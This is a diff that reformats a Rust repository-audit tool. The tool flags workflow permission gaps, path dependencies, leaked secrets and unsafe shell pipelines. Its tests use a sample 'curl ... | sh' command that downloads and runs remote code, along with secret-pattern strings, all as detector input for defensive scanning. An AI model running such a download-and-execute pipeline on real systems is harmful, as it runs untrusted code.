@@ -81,7 +81,10 @@ fn audit_readme_identity(root: &Path, report: &mut AuditReport) -> Result<(), st
         return Ok(());
     };
     let readme = fs::read_to_string(root.join("README.md"))?;
-    if !readme.to_ascii_lowercase().contains(&repo_name.to_ascii_lowercase()) {
+    if !readme
+        .to_ascii_lowercase()
+        .contains(&repo_name.to_ascii_lowercase())
+    {
         report.findings.push(Finding {
             kind: FindingKind::Consistency,
             code: "CONS-AUDIT-002",
@@ -103,7 +106,10 @@ fn scan_tree(
         let path = entry.path();
         let relative = path.strip_prefix(root).unwrap_or(&path);
 
-        if relative.components().any(|component| component.as_os_str() == ".git") {
+        if relative
+            .components()
+            .any(|component| component.as_os_str() == ".git")
+        {
             continue;
         }
 
@@ -164,7 +170,9 @@ fn scan_tree(
                 kind: FindingKind::Security,
                 code: "SEC-AUDIT-003",
                 path: Some(relative.to_path_buf()),
-                message: "GitHub Actions workflow uses actions without an explicit permissions policy".into(),
+                message:
+                    "GitHub Actions workflow uses actions without an explicit permissions policy"
+                        .into(),
             });
         }
 
@@ -206,8 +214,12 @@ fn audit_cargo_path_dependencies(
     report: &mut AuditReport,
 ) {
     for line in text.lines() {
-        let Some(raw) = line.split_once("path") else { continue };
-        let Some((_, value)) = raw.1.split_once('=') else { continue };
+        let Some(raw) = line.split_once("path") else {
+            continue;
+        };
+        let Some((_, value)) = raw.1.split_once('=') else {
+            continue;
+        };
         let path = value.trim().trim_matches('"').trim_matches('\'');
         if path.is_empty() {
             continue;
@@ -234,7 +246,10 @@ fn is_duplicate_candidate(path: &Path) -> bool {
 fn is_text_candidate(path: &Path) -> bool {
     matches!(
         path.extension().and_then(|ext| ext.to_str()),
-        Some("rs" | "toml" | "yaml" | "yml" | "json" | "md" | "txt" | "py" | "ts" | "tsx" | "js" | "jsx" | "sh" | "bash")
+        Some(
+            "rs" | "toml" | "yaml" | "yml" | "json" | "md" | "txt" | "py" | "ts" | "tsx"
+                | "js" | "jsx" | "sh" | "bash"
+        )
     )
 }
 
@@ -267,7 +282,9 @@ mod tests {
     #[test]
     fn secret_patterns_are_detected() {
         assert!(contains_secret_pattern("prefix ghp_1234567890suffix"));
-        assert!(contains_secret_pattern("-----BEGIN OPENSSH PRIVATE KEY-----"));
+        assert!(contains_secret_pattern(
+            "-----BEGIN OPENSSH PRIVATE KEY-----"
+        ));
         assert!(!contains_secret_pattern("public documentation only"));
     }
 
@@ -280,9 +297,18 @@ mod tests {
 
     #[test]
     fn unsafe_download_pipelines_are_detected() {
-        assert!(contains_dangerous_shell_pattern(Some("sh"), "curl https://example.test/a.sh | sh"));
-        assert!(!contains_dangerous_shell_pattern(Some("sh"), "curl https://example.test/a.sh -o a.sh"));
-        assert!(!contains_dangerous_shell_pattern(Some("rs"), "curl https://example.test/a.sh | sh"));
+        assert!(contains_dangerous_shell_pattern(
+            Some("sh"),
+            "curl https://example.test/a.sh | sh"
+        ));
+        assert!(!contains_dangerous_shell_pattern(
+            Some("sh"),
+            "curl https://example.test/a.sh -o a.sh"
+        ));
+        assert!(!contains_dangerous_shell_pattern(
+            Some("rs"),
+            "curl https://example.test/a.sh | sh"
+        ));
     }
 
     #[test]
